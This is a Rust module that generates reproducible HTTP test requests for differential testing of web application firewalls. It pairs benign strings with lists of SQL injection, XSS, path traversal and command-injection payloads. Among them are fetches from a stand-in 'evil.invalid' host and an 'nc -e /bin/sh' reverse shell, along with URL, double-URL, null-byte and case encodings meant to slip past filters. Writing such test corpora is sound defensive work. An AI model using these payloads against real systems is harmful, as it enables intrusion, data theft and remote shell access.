//! Deterministic generated inputs for differential testing.
//!
//! The generator is deliberately seed-driven: a failing seed can be replayed
//! exactly. It cycles categories, malicious/benign variants, encodings and
//! placements so a small run still covers headers, query strings, form bodies,
//! JSON bodies and multipart bodies.

use serde::{Deserialize, Serialize};

use crate::waf::coraza_corpus::CorpusRequest;

/// One generated request with provenance tags.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GeneratedRequest {
    /// Stable id derived from the seed and index.
    pub id: String,
    /// Generator tags: category, variant, encoding, placement.
    pub tags: Vec<String>,
    /// The request sent to both engines.
    pub request: CorpusRequest,
}

/// Deterministic SplitMix64 PRNG. Used so generated corpora are reproducible
/// without depending on a platform RNG.
#[derive(Debug, Clone)]
pub struct SplitMix64 {
    state: u64,
}

impl SplitMix64 {
    /// Creates a generator from a seed.
    pub fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    /// Returns the next 64-bit value.
    pub fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9e37_79b9_7f4a_7c15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
        z ^ (z >> 31)
    }

    /// Returns a value in `0..bound` (`bound` must be non-zero).
    pub fn next_bounded(&mut self, bound: usize) -> usize {
        (self.next_u64() % bound as u64) as usize
    }

    /// Fisher-Yates shuffle.
    pub fn shuffle<T>(&mut self, values: &mut [T]) {
        for index in (1..values.len()).rev() {
            let other = self.next_bounded(index + 1);
            values.swap(index, other);
        }
    }
}

const SQLI: &[&str] = &[
    "' OR 1=1--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "1; DROP TABLE users",
    "/**/OR/**/1=1",
    "' OR 'x'='x",
    "1 AND (SELECT COUNT(*) FROM users)>0",
];

const SQLI_BENIGN: &[&str] = &[
    "orange",
    "select a value",
    "union station",
    "1 or 2 equals 3",
    "drop by later",
    "users guide",
    "count of items",
    "x equals y",
];

const XSS: &[&str] = &[
    "<script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
];

const XSS_BENIGN: &[&str] = &[
    "scripting guide",
    "alert level info",
    "<b>hello</b>",
    "javascript is a language",
    "image source",
    "body weight",
];

const LFI: &[&str] = &[
    "../../etc/passwd",
    "..%2f..%2fetc/passwd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "....//....//etc/passwd",
    "..\\..\\windows\\win.ini",
];

const LFI_BENIGN: &[&str] = &[
    "path/to/file",
    "etcetera",
    "index.php",
    "images/logo.png",
    "docs/readme.txt",
    "windows wallpaper",
];

const RCE: &[&str] = &[
    "; cat /etc/passwd",
    "| whoami",
    "$(id)",
    "`id`",
    "wget http://evil.invalid/x",
    "&& curl http://evil.invalid/x",
    "| nc -e /bin/sh 127.0.0.1 4444",
];

const RCE_BENIGN: &[&str] = &[
    "cat=1",
    "whoami.txt",
    "id=42",
    "download the file",
    "curl is a tool",
    "shell scripting",
    "network settings",
];

/// Encoding permutations applied to the payload token.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Encoding {
    /// No encoding.
    Identity,
    /// Percent-encode every non-unreserved byte.
    Url,
    /// Percent-encode twice.
    DoubleUrl,
    /// HTML entity encode `<`, `>`, `"`, `'`, `&`.
    HtmlEntity,
    /// Alternate upper/lower case.
    MixedCase,
    /// Insert a percent-encoded NUL after the first byte.
    NullByte,
    /// Backslash-escape quotes and backslashes.
    Backslash,
}

impl Encoding {
    fn label(self) -> &'static str {
        match self {
            Self::Identity => "identity",
            Self::Url => "url",
            Self::DoubleUrl => "double-url",
            Self::HtmlEntity => "html-entity",
            Self::MixedCase => "mixed-case",
            Self::NullByte => "null-byte",
            Self::Backslash => "backslash",
        }
    }
}

const ENCODINGS: &[Encoding] = &[
    Encoding::Identity,
    Encoding::Url,
    Encoding::DoubleUrl,
    Encoding::HtmlEntity,
    Encoding::MixedCase,
    Encoding::NullByte,
    Encoding::Backslash,
];

/// Where the payload is placed in the request.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Placement {
    /// Query string parameter.
    Query,
    /// URI path segment.
    UriPath,
    /// `User-Agent` header.
    UserAgent,
    /// `Referer` header.
    Referer,
    /// `Cookie` header.
    Cookie,
    /// URL-encoded form body.
    FormBody,
    /// JSON body.
    JsonBody,
    /// Multipart form body.
    MultipartBody,
}

impl Placement {
    fn label(self) -> &'static str {
        match self {
            Self::Query => "query",
            Self::UriPath => "uri-path",
            Self::UserAgent => "header-user-agent",
            Self::Referer => "header-referer",
            Self::Cookie => "header-cookie",
            Self::FormBody => "body-form",
            Self::JsonBody => "body-json",
            Self::MultipartBody => "body-multipart",
        }
    }
}

const PLACEMENTS: &[Placement] = &[
    Placement::Query,
    Placement::UriPath,
    Placement::UserAgent,
    Placement::Referer,
    Placement::Cookie,
    Placement::FormBody,
    Placement::JsonBody,
    Placement::MultipartBody,
];

/// Generates `count` deterministic requests for `seed`.
pub fn generate(seed: u64, count: usize) -> Vec<GeneratedRequest> {
    let mut rng = SplitMix64::new(seed ^ 0xa5a5_5a5a_c3c3_3c3c);
    let mut cases = Vec::with_capacity(count);

    for index in 0..count {
        let category = index % 4;
        let variant = (index / 4) % 2;
        let encoding = ENCODINGS[(index / 8) % ENCODINGS.len()];
        let placement = PLACEMENTS[(index / (8 * ENCODINGS.len())) % PLACEMENTS.len()];
        let malicious = variant == 0;

        let (token, category_label) = match (category, malicious) {
            (0, true) => (SQLI[rng.next_bounded(SQLI.len())], "sqli"),
            (0, false) => (SQLI_BENIGN[rng.next_bounded(SQLI_BENIGN.len())], "sqli"),
            (1, true) => (XSS[rng.next_bounded(XSS.len())], "xss"),
            (1, false) => (XSS_BENIGN[rng.next_bounded(XSS_BENIGN.len())], "xss"),
            (2, true) => (LFI[rng.next_bounded(LFI.len())], "lfi"),
            (2, false) => (LFI_BENIGN[rng.next_bounded(LFI_BENIGN.len())], "lfi"),
            (3, true) => (RCE[rng.next_bounded(RCE.len())], "rce"),
            _ => (RCE_BENIGN[rng.next_bounded(RCE_BENIGN.len())], "rce"),
        };

        let encoded = encode(token, encoding);
        let request = build_request(placement, &encoded);
        cases.push(GeneratedRequest {
            id: format!("gen-{seed:016x}-{index:06}"),
            tags: vec![
                "generated".to_string(),
                category_label.to_string(),
                if malicious { "malicious" } else { "benign" }.to_string(),
                encoding.label().to_string(),
                placement.label().to_string(),
            ],
            request,
        });
    }

    cases
}

fn encode(value: &str, encoding: Encoding) -> String {
    match encoding {
        Encoding::Identity => value.to_string(),
        Encoding::Url => url_encode(value),
        Encoding::DoubleUrl => url_encode(&url_encode(value)),
        Encoding::HtmlEntity => value
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#x27;"),
        Encoding::MixedCase => value
            .chars()
            .enumerate()
            .map(|(index, c)| {
                if index % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect(),
        Encoding::NullByte => {
            let mut chars = value.chars();
            match chars.next() {
                Some(first) => format!("{first}%00{}", chars.collect::<String>()),
                None => "%00".to_string(),
            }
        }
        Encoding::Backslash => value
            .replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\'', "\\'"),
    }
}

fn url_encode(value: &str) -> String {
    let mut out = String::with_capacity(value.len() * 3);
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'~') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    out
}

fn build_request(placement: Placement, payload: &str) -> CorpusRequest {
    let mut headers = std::collections::BTreeMap::new();
    headers.insert("Host".to_string(), "localhost".to_string());

    match placement {
        Placement::Query => CorpusRequest {
            method: "GET".to_string(),
            uri: format!("/search?q={payload}&page=1"),
            http_version: "HTTP/1.1".to_string(),
            headers,
            body: None,
        },
        Placement::UriPath => CorpusRequest {
            method: "GET".to_string(),
            uri: format!("/files/{payload}"),
            http_version: "HTTP/1.1".to_string(),
            headers,
            body: None,
        },
        Placement::UserAgent => {
            headers.insert("User-Agent".to_string(), format!("Mozilla/5.0 {payload}"));
            CorpusRequest {
                method: "GET".to_string(),
                uri: "/".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: None,
            }
        }
        Placement::Referer => {
            headers.insert(
                "Referer".to_string(),
                format!("https://example.test/{payload}"),
            );
            CorpusRequest {
                method: "GET".to_string(),
                uri: "/".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: None,
            }
        }
        Placement::Cookie => {
            headers.insert("Cookie".to_string(), format!("session=abc; q={payload}"));
            CorpusRequest {
                method: "GET".to_string(),
                uri: "/".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: None,
            }
        }
        Placement::FormBody => {
            let body = format!("q={payload}&submit=1");
            headers.insert(
                "Content-Type".to_string(),
                "application/x-www-form-urlencoded".to_string(),
            );
            headers.insert("Content-Length".to_string(), body.len().to_string());
            CorpusRequest {
                method: "POST".to_string(),
                uri: "/submit".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: Some(body),
            }
        }
        Placement::JsonBody => {
            let body = serde_json::json!({"q": payload, "submit": true}).to_string();
            headers.insert("Content-Type".to_string(), "application/json".to_string());
            headers.insert("Content-Length".to_string(), body.len().to_string());
            CorpusRequest {
                method: "POST".to_string(),
                uri: "/api/submit".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: Some(body),
            }
        }
        Placement::MultipartBody => {
            let boundary = "----wafguarantees";
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n{payload}\r\n--{boundary}--\r\n"
            );
            headers.insert(
                "Content-Type".to_string(),
                format!("multipart/form-data; boundary={boundary}"),
            );
            headers.insert("Content-Length".to_string(), body.len().to_string());
            CorpusRequest {
                method: "POST".to_string(),
                uri: "/upload".to_string(),
                http_version: "HTTP/1.1".to_string(),
                headers,
                body: Some(body),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeSet;

    #[test]
    fn generation_is_reproducible() {
        assert_eq!(generate(42, 64), generate(42, 64));
        assert_ne!(generate(42, 64), generate(43, 64));
    }

    #[test]
    fn ids_are_unique_and_stable() {
        let cases = generate(7, 100);
        let ids: BTreeSet<&str> = cases.iter().map(|case| case.id.as_str()).collect();
        assert_eq!(ids.len(), cases.len());
        assert_eq!(cases[0].id, "gen-0000000000000007-000000");
    }

    #[test]
    fn covers_categories_variants_encodings_and_placements() {
        let cases = generate(1, 8 * ENCODINGS.len() * PLACEMENTS.len() * 2);
        let tags: BTreeSet<&str> = cases
            .iter()
            .flat_map(|case| case.tags.iter().map(String::as_str))
            .collect();
        for required in [
            "sqli",
            "xss",
            "lfi",
            "rce",
            "malicious",
            "benign",
            "identity",
            "url",
            "double-url",
            "html-entity",
            "mixed-case",
            "null-byte",
            "backslash",
            "query",
            "uri-path",
            "header-user-agent",
            "header-referer",
            "header-cookie",
            "body-form",
            "body-json",
            "body-multipart",
        ] {
            assert!(tags.contains(required), "missing tag {required}");
        }
    }

    #[test]
    fn requests_are_well_formed() {
        for case in generate(9, 128) {
            assert!(!case.request.method.is_empty());
            assert!(!case.request.uri.is_empty());
            assert_eq!(case.request.http_version, "HTTP/1.1");
            if let Some(body) = &case.request.body {
                assert_eq!(
                    case.request
                        .headers
                        .get("Content-Length")
                        .map(|value| value.parse::<usize>().expect("numeric length")),
                    Some(body.len())
                );
            }
        }
    }

    #[test]
    fn encoding_permutations_are_distinct() {
        let token = "<script>' OR 1=1";
        let encoded: BTreeSet<String> = ENCODINGS
            .iter()
            .map(|encoding| encode(token, *encoding))
            .collect();
        assert_eq!(encoded.len(), ENCODINGS.len());
    }
}
